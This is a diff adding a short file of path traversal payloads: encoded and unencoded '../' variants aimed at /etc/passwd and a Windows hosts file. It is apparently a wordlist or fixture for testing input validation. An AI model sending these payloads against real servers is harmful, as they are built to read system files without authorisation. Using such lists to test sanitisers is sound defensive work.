@@ -1,0 +1,15 @@
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+....//etc/passwd
+..%2Fetc%2Fpasswd
+%2e%2e%2fetc%2fpasswd
+..%252Fetc%252Fpasswd
+..\etc\passwd
+..%5Cetc%5Cpasswd
+%2e%2e/%2e%2e/etc/passwd
+..%c0%afetc%c0%afpasswd
+..%e0%80%afetc%e0%80%afpasswd
+....\\etc\\passwd
+/var/www/html/../../../etc/passwd
+../../../windows/system32/drivers/etc/hosts
